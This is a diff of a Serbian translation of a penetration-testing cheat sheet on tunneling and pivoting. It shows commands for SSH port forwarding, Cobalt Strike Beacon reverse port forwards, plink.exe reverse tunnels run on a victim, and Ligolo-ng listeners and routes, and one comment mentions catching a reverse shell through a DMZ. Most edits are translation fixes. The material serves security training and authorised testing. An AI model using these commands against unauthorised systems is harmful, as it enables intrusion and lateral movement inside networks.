@@ -41,7 +41,7 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-SSH графичка веза (X)
+SSH grafička veza (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -71,7 +71,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Обратно прослеђивање порта
 
-Ово је корисно за добијање обрнутог шела изнутра хостова преко DMZ-а до вашег хоста:
+Ово је корисно за добијање обрнутог шелла изнутра хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -167,14 +167,14 @@ rportfwd stop [bind port]
 ```
 To note:
 
-* Beaconova reverzna port preusmeravanja je dizajnirana da **tuneluje saobraćaj ka Team Serveru, a ne za preusmeravanje između pojedinačnih mašina**.
+* Beaconova reverzna port preusmeravanja je dizajnirana da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
 * Saobraćaj je **tunelovan unutar Beaconovog C2 saobraćaja**, uključujući P2P linkove.
 * **Administratorske privilegije nisu potrebne** za kreiranje reverznih port preusmeravanja na visokim portovima.
 
 ### rPort2Port lokalno
 
 {% hint style="warning" %}
-U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru i **saobraćaj se šalje Cobalt Strike klijentu** (ne na Team Server) i odatle na navedeni host:port
+U ovom slučaju, **port je otvoren na beacon host-u**, a ne na Team Server-u i **saobraćaj se šalje Cobalt Strike klijentu** (ne na Team Server) i odatle na navedeni host:port
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -235,13 +235,19 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Agent Binding and Listening
+### Veza agenta i slušanje
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
 listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
+```
+### Pristup lokalnim portovima agenta
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
 ```
 ## Rpivot
 
@@ -330,7 +336,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY-a (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da imamo obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -391,7 +397,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ova alatka se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -522,7 +528,7 @@ _ Takođe je moguće dodati autentifikaciju i TLS, ako je potrebno._
 #### Sniffing HTTP calls
 
 _Korisno za XSS, SSRF, SSTI ..._\
-Direktno iz stdout ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).
+Direktno iz stdout-a ili u HTTP interfejsu [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
 #### Tunneling internal HTTP service
 ```bash
